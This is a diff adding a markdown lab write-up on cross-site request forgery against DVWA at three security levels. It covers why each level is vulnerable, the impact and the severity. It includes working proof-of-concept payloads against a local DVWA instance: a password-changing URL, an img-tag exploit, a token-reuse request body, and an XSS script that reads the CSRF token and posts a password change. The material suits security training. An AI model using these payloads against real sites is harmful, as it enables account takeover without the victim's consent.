@@ -1,0 +1,198 @@
+# Cross-Site Request Forgery (CSRF)
+
+**Security Levels:** Low | Medium | High
+
+---
+
+## LOW Level
+
+### Why it is Vulnerable
+
+* No CSRF token implemented
+* No request origin validation
+* State‑changing action via GET request
+* No user confirmation required
+* No SameSite cookie protection
+
+---
+
+### Vulnerable Behavior
+
+```http
+GET /dvwa/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change HTTP/1.1
+```
+
+---
+
+### Payloads (PoC)
+
+#### Malicious URL
+
+```
+http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change
+```
+
+---
+
+#### HTML CSRF Exploit
+
+```html
+<img src="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change">
+```
+
+---
+
+### Exploitation Steps
+
+* Victim logs into DVWA
+* Attacker sends crafted link
+* Victim clicks link or loads page
+* Password changed automatically
+
+---
+
+### Result
+
+* Password changed without user consent
+* No alert or warning shown
+
+---
+
+### Impact
+
+* Account takeover
+* Unauthorized password change
+
+---
+
+### Severity: **High**
+
+---
+
+## MEDIUM Level
+
+### Why it is Vulnerable
+
+* CSRF token implemented
+* Token is predictable
+* Token not tied to user session
+* Reusable token allowed
+
+---
+
+### Code Behavior
+
+```php
+<input type="hidden" name="user_token" value="static_token">
+```
+
+---
+
+### Payloads (PoC)
+
+#### Token Reuse Attack
+
+```
+password_new=attacker123
+password_conf=attacker123
+user_token=static_token
+```
+
+---
+
+### Exploitation Steps
+
+* Capture CSRF token once
+* Reuse token in multiple requests
+* Server accepts request
+
+---
+
+### Result
+
+* CSRF protection bypassed
+* Password changed successfully
+
+---
+
+### Impact
+
+* Weak CSRF defense
+* Token misuse leads to compromise
+
+---
+
+### Severity: **Medium**
+
+---
+
+## HIGH Level
+
+### Why it is Vulnerable
+
+* CSRF token is session-based
+* Token regenerated per request
+* Protection relies on token only
+* No SameSite or Origin validation
+
+---
+
+### Vulnerable Logic
+
+```php
+if ($_SESSION['user_token'] === $_POST['user_token']) {
+    change_password();
+}
+```
+
+---
+
+### Attack Concept
+
+> Exploit **token exposure via same-origin** or **XSS chaining** to bypass CSRF.
+
+---
+
+### Payloads (PoC)
+
+#### CSRF via XSS Chaining
+
+```html
+<script>
+fetch("/dvwa/vulnerabilities/csrf/", {
+  method: "POST",
+  body: "password_new=xss123&password_conf=xss123&user_token="+document.querySelector('[name=user_token]').value,
+  headers: {"Content-Type":"application/x-www-form-urlencoded"}
+});
+</script>
+```
+
+---
+
+### Result
+
+* CSRF token stolen
+* Request executed successfully
+* Password changed
+
+---
+
+### Impact
+
+* CSRF protection defeated
+* Full account compromise
+
+---
+
+### Severity: **High**
+
+---
+
+## Overall Impact Summary
+
+* CSRF allows unauthorized state change
+* GET‑based actions are dangerous
+* Token logic flaws reduce protection
+* Chaining with XSS leads to full compromise
+
+---
